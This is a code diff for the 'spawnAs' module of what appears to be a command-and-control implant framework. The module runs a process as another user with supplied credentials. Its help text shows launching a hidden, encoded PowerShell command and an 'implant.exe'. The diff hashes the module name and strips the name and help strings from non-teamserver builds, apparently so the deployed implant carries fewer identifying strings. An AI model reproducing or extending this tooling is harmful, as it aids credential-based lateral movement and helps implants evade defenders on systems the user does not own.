@@ -21,7 +21,8 @@ using namespace std;
 
 #endif
 
-const std::string moduleName = "spawnAs";
+constexpr std::string_view moduleName = "spawnAs";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -34,7 +35,11 @@ __declspec(dllexport) SpawnAs* A_SpawnAsConstructor()
 #endif
 
 SpawnAs::SpawnAs()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -45,12 +50,13 @@ SpawnAs::~SpawnAs()
 std::string SpawnAs::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "spawnAs:\n";
 	info += "Launch a new process as another user, with the given credentials. \n";
 	info += "exemple:\n";
 	info += "- spawnAs DOMAIN\\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...\n";
     info += "- spawnAs .\\Administrator Password C:\\Users\\Public\\Documents\\implant.exe\n";
-
+#endif
 	return info;
 }
 
@@ -95,7 +101,7 @@ int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
             programToLaunch+=splitedCmd[idx];
         }
 		
-        c2Message.set_instruction(m_name);
+        c2Message.set_instruction(splitedCmd[0]);
         c2Message.set_cmd(cmd);
 		c2Message.set_data(programToLaunch.data(), programToLaunch.size());
 	}
@@ -168,7 +174,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += message;
         cmd += " ";
         cmd += payload;
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 0;
@@ -181,7 +187,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     result += "Success.\n";
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
     cmd += " ";
     cmd += payload;
 	c2RetMessage.set_cmd(cmd);
